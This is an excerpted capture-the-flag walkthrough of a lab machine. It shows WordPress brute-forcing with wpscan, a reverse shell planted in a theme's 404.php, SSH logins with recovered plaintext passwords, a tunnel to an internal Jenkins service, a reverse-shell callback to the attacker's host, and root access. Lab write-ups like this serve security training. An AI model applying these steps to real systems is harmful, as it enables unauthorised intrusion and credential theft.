...
```shell
$ wpscan --url http://10.10.227.60/blog --usernames admin \
...
And navigate to `http://10.10.227.60.thm/blog/wp-content/themes/twentyseventeen/404.php`. You should see a terminal call back to your reverse shell. Running `whoami` on the shell tells us we are currently` www-data`, which is a common account for web servers to run in.
...
```shell
$ ssh aubreanna@10.10.227.60
...
aubreanna@10.10.227.60 s password: bubb13guM!@#123
...
aubreanna@internal:~$
```
...
```shell
$ ssh -L 7654:172.17.0.2:8080 aubreanna@10.10.227.60
...
```
...
connect to [10.14.32.102] from internal.thm [10.10.234.17]
whoami
jenkins
```
...
```shell
$ ssh root@10.10.234.17
root@10.10.234.17 s password: tr0ub13guM!@#123
$ cat root.txt
.........
```
